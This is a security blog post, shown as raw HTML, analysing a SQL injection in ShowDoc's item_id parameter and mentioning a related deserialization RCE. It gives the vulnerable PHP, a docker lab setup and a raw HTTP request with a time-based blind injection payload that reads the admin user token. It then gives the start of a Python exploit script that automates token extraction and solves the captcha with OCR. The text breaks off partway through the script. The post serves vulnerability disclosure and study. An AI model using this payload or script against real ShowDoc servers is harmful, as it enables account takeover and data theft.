<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  
    

    
      
      

      
        <!-- it's a local file path -->

      
    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="ShowDoc Sql Injection and Remote Code Execution" />
<meta name="author" content="tomcat" />
<meta property="og:locale" content="en" />
<meta name="description" content="Overview" />
<meta property="og:description" content="Overview" />
<link rel="canonical" href="/posts/showdoc-sql-injection-and-rce/" />
<meta property="og:url" content="/posts/showdoc-sql-injection-and-rce/" />
<meta property="og:site_name" content="imjdl blog" />
<meta property="og:image" content="/assets/img/showdoc/logo.webp" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-06-02T12:13:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/showdoc/logo.webp" />
<meta property="twitter:title" content="ShowDoc Sql Injection and Remote Code Execution" />
<meta name="twitter:site" content="@Mortyjin" />
<meta name="twitter:creator" content="@MortyJin" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"tomcat","url":"https://twitter.com/MortyJin"},"dateModified":"2024-06-18T17:18:59+08:00","datePublished":"2024-06-02T12:13:00+08:00","description":"Overview","headline":"ShowDoc Sql Injection and Remote Code Execution","image":"/assets/img/showdoc/logo.webp","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/showdoc-sql-injection-and-rce/"},"url":"/posts/showdoc-sql-injection-and-rce/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>ShowDoc Sql Injection and Remote Code Execution | imjdl blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imjdl blog">
<meta name="application-name" content="imjdl blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/favicons/log.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">imjdl blog</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Perpetual student, continual incremental improvement.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/reading-list/" class="nav-link">
            <i class="fa-fw fa fa-list-alt"></i>
            

            <span>READING LIST</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imjdl"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/Mortyjin"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['imelloit','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>ShowDoc Sql Injection and Remote Code Execution</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>ShowDoc Sql Injection and Remote Code Execution</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1717301580"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jun  2, 2024
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1718702339"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jun 18, 2024
</time>

        </span>
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/showdoc/logo.webp" class="popup img-link preview-img shimmer"><img src="/assets/img/showdoc/logo.webp"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                <a href="https://twitter.com/MortyJin">tomcat</a>
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1182 words"
>
  <em>6 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <h2 id="overview"><span class="me-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>ShowDoc is a versatile online documentation tool tailored for IT teams, perfect for creating beautiful API documents,
tech manuals, and more using markdown. Its features include automated document generation from code comments or via the
RunApi client, multi-platform support, and robust team collaboration tools. Widely adopted by over 100,000 internet
teams, including major corporations, ShowDoc offers both public and private project options, extensive edit
capabilities, and responsive design for easy access across devices.</p>

<h2 id="technical-analysis"><span class="me-2">Technical Analysis</span><a href="#technical-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>The developers of ShowDoc fixed an SQL injection vulnerability in the <code class="language-plaintext highlighter-rouge">pwd</code> function related to the <code class="language-plaintext highlighter-rouge">item_id</code> parameter
in
<code class="language-plaintext highlighter-rouge">server/Application/Api/Controller/ItemController.class.php</code> in
version <a href="https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda">v3.2.6[1]</a>.
They also fixed a deserialization vulnerability caused by the <code class="language-plaintext highlighter-rouge">new_is_writeable</code> function
in <code class="language-plaintext highlighter-rouge">server/Application/Home/Controller/IndexController.class.php</code> in
version <a href="https://github.com/star7th/showdoc/commit/805983518081660594d752573273b8fb5cbbdb30">v3.2.5[2]</a>.</p>

<h3 id="sql-injection"><span class="me-2">Sql Injection</span><a href="#sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The <code class="language-plaintext highlighter-rouge">pwd</code> function in <code class="language-plaintext highlighter-rouge">server/Application/Api/Controller/ItemController.class.php</code> is vulnerable to SQL injection.
The <code class="language-plaintext highlighter-rouge">item_id</code> parameter is not properly sanitized, allowing an attacker to inject arbitrary SQL code.</p>

<p><a href="/assets/img/showdoc/sql.png" class="popup img-link  shimmer"><img src="/assets/img/showdoc/sql.png" alt="img.png" loading="lazy"></a></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="k">public</span> <span class="k">function</span> <span class="n">pwd</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$item_id</span> <span class="o">=</span> <span class="nf">I</span><span class="p">(</span><span class="s2">"item_id"</span><span class="p">);</span>
    <span class="nv">$page_id</span> <span class="o">=</span> <span class="nf">I</span><span class="p">(</span><span class="s2">"page_id/d"</span><span class="p">);</span>
    <span class="nv">$password</span> <span class="o">=</span> <span class="nf">I</span><span class="p">(</span><span class="s2">"password"</span><span class="p">);</span>
    <span class="nv">$refer_url</span> <span class="o">=</span> <span class="nf">I</span><span class="p">(</span><span class="s1">'refer_url'</span><span class="p">);</span>
    <span class="nv">$captcha_id</span> <span class="o">=</span> <span class="nf">I</span><span class="p">(</span><span class="s2">"captcha_id"</span><span class="p">);</span>
    <span class="nv">$captcha</span> <span class="o">=</span> <span class="nf">I</span><span class="p">(</span><span class="s2">"captcha"</span><span class="p">);</span>

    <span class="c1">//  -- snip --</span>
    <span class="nv">$item</span> <span class="o">=</span> <span class="nf">D</span><span class="p">(</span><span class="s2">"Item"</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">where</span><span class="p">(</span><span class="s2">"item_id = '</span><span class="nv">$item_id</span><span class="s2">' "</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">find</span><span class="p">();</span>  <span class="c1">// Sql Injection</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$password</span> <span class="o">&amp;&amp;</span> <span class="nv">$item</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">session</span><span class="p">(</span><span class="s2">"visit_item_"</span> <span class="mf">.</span> <span class="nv">$item_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">sendResult</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">"refer_url"</span> <span class="o">=&gt;</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$refer_url</span><span class="p">)));</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">sendError</span><span class="p">(</span><span class="mi">10010</span><span class="p">,</span> <span class="nf">L</span><span class="p">(</span><span class="s1">'access_password_are_incorrect'</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>ShowDoc is a secondary development based on ThinkPHP3.2.3, which can directly obtain the value of <code class="language-plaintext highlighter-rouge">item_id</code>
using <code class="language-plaintext highlighter-rouge">I("item_id")</code>.
We can quickly set up a ShowDoc environment using Docker, as shown below, and send a POST request to test for SQL
injection.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>docker run <span class="nt">-d</span> <span class="nt">--name</span> showdoc <span class="se">\ </span>                               
<span class="nt">--user</span><span class="o">=</span>root <span class="nt">--privileged</span><span class="o">=</span><span class="nb">true</span> <span class="se">\ </span> 
<span class="nt">-p</span> 4999:80 <span class="se">\ </span>         
<span class="nt">-v</span> /showdoc_data/html:/var/www/html/ <span class="se">\</span>
star7th/showdoc:v3.2.4
</pre></td></tr></tbody></table></code></div></div>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/server/index.php?s=/api/Item/pwd</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.32.128:4999</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://192.168.32.128:4999</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://192.168.32.128:4999/web/</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=04d3132934531e78f6608229071059ac; think_language=en-US</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">254</span>

item_id=%27+OR+1%3D%28case+when%28substr%28%28select+token+from+user_token+where+uid%3D1%29%2C1%2C1%29%3D%272%27%29+then+randomblob%281000000000%29+else+0+end%29+OR%271%27%3D%271&amp;page_id=123123&amp;password=12312&amp;refer_url=123123&amp;captcha_id=6138&amp;captcha=e863
</pre></td></tr></tbody></table></code></div></div>

<p>And I have written a script to obtain the token through time-based blind injection and recognize the captcha through
<code class="language-plaintext highlighter-rouge">dddocr</code>.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">time</span>

<span class="kn">import</span> <span class="n">onnxruntime</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">ddddocr</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">session</span><span class="p">()</span>

<span class="n">chars</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">c</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">d</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">e</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">f</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">g</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">h</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">i</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">j</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">k</span><span class="sh">'</span><span class="p">,</span>
         <span class="sh">'</span><span class="s">l</span><span class="sh">'</span><span class="p">,</span>
         <span class="sh">'</span><span class="s">m</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">o</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">p</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">q</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">t</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">u</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">v</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">y</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">z</span><span class="sh">'</span><span class="p">]</span>

<span class="n">token</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">]</span> <span class="o">*</span> <span class="mi">64</span>


<span class="k">def</span> <span class="nf">inject</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
  <span class="k">global</span> <span class="n">session</span>
  <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">64</span><span class="p">:</span>
      <span class="k">break</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
      <span class="n">captcha_str</span><span class="p">,</span> <span class="n">captcha_id</span> <span class="o">=</span> <span class="nf">show_captcha</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
      <span class="n">burp0_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/server/index.php?s=/api/Item/pwd</span><span class="sh">"</span>
      <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/json, text/plain, */*</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Accept-Language</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">en-US,en;q=0.5</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Accept-Encoding</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">gzip, deflate, br</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/x-www-form-urlencoded</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Origin</span><span class="sh">"</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span> <span class="sh">"</span><span class="s">Connection</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">keep-alive</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Referer</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/web/</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Pragma</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">no-cache</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Cache-Control</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">no-cache</span><span class="sh">"</span><span class="p">}</span>
      <span class="n">burp0_data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">item_id</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"'</span><span class="s"> OR 1=(case when(substr((select token from user_token where uid=1),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">,1)=</span><span class="sh">'</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="sh">'</span><span class="s">) then randomblob(1000000000) else 0 end) OR</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">page_id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">123123</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">12312</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">refer_url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">123123</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">captcha_id</span><span class="sh">"</span><span class="p">:</span> <span class="n">captcha_id</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">captcha</span><span class="sh">"</span><span class="p">:</span> <span class="n">captcha_str</span><span class="p">}</span>
